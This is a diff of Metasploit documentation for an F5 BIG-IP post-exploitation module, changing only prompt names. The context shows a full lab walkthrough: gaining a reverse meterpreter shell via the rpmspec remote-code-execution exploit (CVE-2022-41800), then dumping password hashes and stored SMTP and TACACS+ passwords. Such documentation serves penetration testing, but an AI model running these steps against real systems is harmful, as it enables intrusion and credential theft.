@@ -45,15 +45,15 @@ Default: false (due to the speed)
 First, get a non-root session however you can. I used the rpmspec vuln:
 
 ```
-msf6 > use exploit/linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800
+msf > use exploit/linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800
 [*] No payload configured, defaulting to cmd/unix/python/meterpreter/reverse_tcp
-msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > set HttpPassword mybigtestpassword
+msf exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > set HttpPassword mybigtestpassword
 HttpPassword => iagotestbigip
-msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > set RHOST 10.0.0.162
+msf exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > set RHOST 10.0.0.162
 RHOST => 10.0.0.162
-msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > set LHOST 10.0.0.179
+msf exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > set LHOST 10.0.0.179
 LHOST => 10.0.0.179
-msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > exploit
+msf exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > exploit
 [*] Started reverse TCP handler on 10.0.0.179:4444 
 [*] Sending stage (40168 bytes) to 10.0.0.162
 [+] Deleted /var/config/rest/node/tmp/708677fa-5b30-43e6-9ce3-d84046e9f6e9.spec
@@ -66,12 +66,12 @@ meterpreter > bg
 Then just use the module, set the SESSION, and run it:
 
 ```
-msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > use post/linux/gather/f5_loot_mcp
-msf6 post(linux/gather/f5_loot_mcp) > set SESSION 1
+msf exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > use post/linux/gather/f5_loot_mcp
+msf post(linux/gather/f5_loot_mcp) > set SESSION 1
 SESSION => 1
-msf6 post(linux/gather/f5_loot_mcp) > set VERBOSE true
+msf post(linux/gather/f5_loot_mcp) > set VERBOSE true
 VERBOSE => true
-msf6 post(linux/gather/f5_loot_mcp) > show options
+msf post(linux/gather/f5_loot_mcp) > show options
 
 Module options (post/linux/gather/f5_loot_mcp):
 
@@ -85,7 +85,7 @@ Module options (post/linux/gather/f5_loot_mcp):
 
 View the full module info with the info, or info -d command.
 
-msf6 post(linux/gather/f5_loot_mcp) > run
+msf post(linux/gather/f5_loot_mcp) > run
 
 [*] Gathering users and password hashes from MCP
 [+] admin:$6$Rvvp3001$4fGV5Pb2gf9rbiV78KCbdbGhfdwsFL0Kt1BR3IIytgb.2aXCpJG0xC2.JDzRvpAjTbIrvBt7YHi2j0mh.ww9i1
@@ -107,7 +107,7 @@ msf6 post(linux/gather/f5_loot_mcp) > run
 The module logs information to the Metasploit database (when connected):
 
 ```
-msf6 post(linux/gather/f5_loot_mcp) > creds
+msf post(linux/gather/f5_loot_mcp) > creds
 Credentials
 ===========
 
@@ -122,7 +122,7 @@ host             origin           service            public            private  
 192.168.159.128  192.168.159.119  25/tcp (smtp)      alice             secretpassword                                                                                              Password            
 192.168.159.200  192.168.159.119  49/tcp (tacacs+)                     tacaspassword                                                                                               Password            
 
-msf6 post(linux/gather/f5_loot_mcp) > services
+msf post(linux/gather/f5_loot_mcp) > services
 Services
 ========
 
@@ -133,5 +133,5 @@ host             port  proto  name     state  info
 192.168.159.128  25    tcp    smtp     open
 192.168.159.200  49    tcp    tacacs+  open
 
-msf6 post(linux/gather/f5_loot_mcp) >
+msf post(linux/gather/f5_loot_mcp) >
 ```
